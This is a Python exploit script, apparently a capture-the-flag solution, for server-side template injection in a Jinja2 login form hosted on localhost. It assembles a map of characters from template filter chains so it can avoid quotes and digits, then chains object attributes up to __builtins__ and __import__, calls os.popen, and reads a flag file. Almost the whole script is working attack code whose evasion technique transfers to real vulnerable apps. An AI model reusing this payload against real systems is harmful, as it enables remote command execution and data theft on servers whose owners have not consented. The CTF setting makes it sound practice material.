import requests
import html

url = "http://127.0.0.1:19999"
cmap = {}

def ssti(i):
    session = requests.Session()
    session.post(url+"/login",data={"username":i})
    r = session.get(url)
    return html.unescape(r.text[8:-1])

def genmap(payloads):
    global cmap
    for i in payloads:
        if len(i)>400:
            print(i)
            break
        i.replace("|list|first","|first")
        t = ssti(i)
        if len(t)>1:
            genmap([i+"|first",i+"|last"])
            continue
        if t not in cmap:
            cmap[t] = i
        if t.upper() != t:
            cmap[t.upper()] = i+"|upper"
        if t.lower() != t:
            cmap[t.lower()] = i+"|lower"

nmap = {
    0:"False|int",
    1:"True|int",
    23:"config|length",
    5:"config|first|length",
    24:"self|string|length",
    14:"self|string|unique|list|length",
    2:"self|string|slice(config|length)|first|length",
    4:"self|string|slice(config|first|length)|list|last|length",
}
nmap[6] = f"self|string|slice({nmap[4]})|first|length"
nmap[3] = f"config|slice({nmap[6]})|list|last|length"

for i in range(1,100):
    nmap[i] = "+".join(["True"]*i)

payloads = [
f"config",
f"config|sort",
f"self|string",
f"config|string",
f"self|string|sort",
f"config|sort|string",
f"config|unique|list",
f"config|string|sort",
f"config|slice({nmap[5]})|list",
f"config|slice({nmap[2]})|list",
f"self|string|slice({nmap[2]})|list",
f"config|sort|slice({nmap[2]})|list",
f"config|string|slice({nmap[2]})|list",
f"config|slice({nmap[3]})|first|last|slice({nmap[3]})|list",
f"config|slice({nmap[5]})|list|last|first|slice({nmap[4]})|list",
f"self|string|slice({nmap[4]})|list",
f"config|first|slice({nmap[2]})|list",
f"self|string|slice({nmap[2]})|first|slice({nmap[4]})|list",
f"config|string|truncate(config|list|length)",
f"config|slice({nmap[4]})|first|last|slice({nmap[3]})|list"
]
payloads.sort(key=lambda x:len(x))

if False:
    print(ssti(f"self|string"))
    print(ssti(f"config|slice({nmap[4]})|first|last|slice({nmap[3]})|list"))
    exit()

genmap(payloads)
print(list(cmap))

def genstr(s):
    return "+".join(cmap[i] for i in s)
    return "("+",".join(cmap[i] for i in s)+")|join"

cmap["/"]=f"""
self
|attr({genstr("__init__")})
|attr({genstr("__globals__")})
|attr({genstr("__getitem__")})
({genstr("__file__")})
|first
""".replace("\n","")

payload = f"""
self
|attr({genstr("__init__")})
|attr({genstr("__globals__")})
|attr({genstr("__getitem__")})
({genstr("__builtins__")})
|attr({genstr("__getitem__")})
({genstr("__import__")})
({genstr("os")})
|attr({genstr("popen")})
({genstr("cat flag/flag.txt")})
|attr({genstr("read")})
()
""".replace("\n","")

print(len(payload))
print(set(payload))
print(ssti(payload))
